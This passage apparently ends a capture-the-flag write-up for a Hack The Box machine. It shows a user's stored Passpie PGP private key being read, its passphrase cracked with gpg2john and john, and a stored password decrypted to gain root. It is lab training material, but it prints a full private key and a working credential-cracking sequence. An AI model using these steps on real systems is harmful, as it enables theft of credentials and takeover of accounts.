  -----END PGP MESSAGE-----


```

```bash
jnelson@meta2:~/.passpie/ssh$ cat /home/jnelson/.passpie/.keys
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

```bash
 gpg2john pgp.key > hash.txt

File pgp.key
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/meta]
└─# cat hash.txt  
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::pgp.key
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/meta]
└─# john hash.txt -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:01 DONE (2025-12-24 23:17) 0.9174g/s 161.4p/s 161.4c/s 161.4C/s ginger..chicken
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
cat encrypted_password.asc
-----BEGIN PGP MESSAGE-----

hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
/2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
lpF0RatbxQGWBks5F3o=
=uh1B
-----END PGP MESSAGE-----
```

```bash
gpg --import pgp.key
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key 387775C35745D203: public key "Passpie (Auto-generated by Passpie) <passpie@local>" imported
```

```bash
gpg --decrypt encrypted_password.asc 
gpg: encrypted with elg1024 key, ID A23EC25F8B5D831A, created 2022-06-26
                                                                              "Passpie (Auto-generated by Passpie) <passpie@local>"
p7qfAZt4_A1xo_0x 
```

```bash
jnelson@meta2:~/.passpie/ssh$ su root
Password: 
root@meta2:/home/jnelson/.passpie/ssh# cat /root/ror
cat: /root/ror: No such file or directory
root@meta2:/home/jnelson/.passpie/ssh# cat /root/root.txt 
77de1bc98a10d16f837f2ea801de4a0b
```

`~Happy Hacking.`